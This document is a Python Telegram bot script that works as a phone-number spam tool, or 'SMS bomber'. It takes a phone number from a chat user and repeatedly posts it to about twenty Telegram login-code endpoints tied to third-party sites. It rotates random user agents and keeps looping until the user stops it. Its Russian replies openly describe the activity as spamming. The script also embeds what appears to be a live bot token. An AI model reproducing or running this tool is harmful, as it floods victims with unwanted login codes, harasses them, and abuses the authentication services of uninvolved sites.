import telebot
import requests
from fake_useragent import UserAgent
import threading

bot = telebot.TeleBot("8788404662:AAHQDvLsRhkXdFNfz_d2rzYHvlKHIed0tjQ")

endpoints = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://oauth.telegram.org/auth/request?bot_id=1878948291&origin=https%3A%2F%2Fwww.cryptobot.com&embed=1&return_to=https%3A%2F%2Fwww.cryptobot.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1573573111&origin=https%3A%2F%2Fcoinmarketcap.com&embed=1&return_to=https%3A%2F%2Fcoinmarketcap.com%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1234567890&origin=https%3A%2F%2Fexample.com&embed=1&return_to=https%3A%2F%2Fexample.com',
    'https://oauth.telegram.org/auth/request?bot_id=987654321&origin=https%3A%2F%2Ftest.com&embed=1&return_to=https%3A%2F%2Ftest.com',
    'https://oauth.telegram.org/auth/request?bot_id=1111111111&origin=https%3A%2F%2Fsite.ru&embed=1&return_to=https%3A%2F%2Fsite.ru',
    'https://oauth.telegram.org/auth/request?bot_id=222222222&origin=https%3A%2F%2Fservice.com&embed=1&return_to=https%3A%2F%2Fservice.com'
]

active = {}

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "отправь номер")

@bot.message_handler(commands=['stop'])
def stop(m):
    if m.chat.id in active:
        active[m.chat.id]['stop'] = True
        bot.reply_to(m, "остановлено")
    else:
        bot.reply_to(m, "нет спама")

@bot.message_handler(func=lambda m: True)
def handle(m):
    phone = ''.join(filter(str.isdigit, m.text.strip()))
    if len(phone) < 10:
        bot.reply_to(m, "не номер")
        return
    if m.chat.id in active:
        bot.reply_to(m, "уже спамим")
        return
    bot.reply_to(m, "спамлю")
    def worker(chat_id, phone):
        ua = UserAgent()
        active[chat_id] = {'stop': False}
        try:
            while not active[chat_id]['stop']:
                for ep in endpoints:
                    if active[chat_id]['stop']:
                        break
                    try:
                        headers = {'user-agent': ua.random}
                        data = {'phone': phone}
                        requests.post(ep, headers=headers, data=data, timeout=10)
                    except:
                        pass
        finally:
            if chat_id in active:
                del active[chat_id]
    threading.Thread(target=worker, args=(m.chat.id, phone), daemon=True).start()

if __name__ == '__main__':
    bot.infinity_polling()
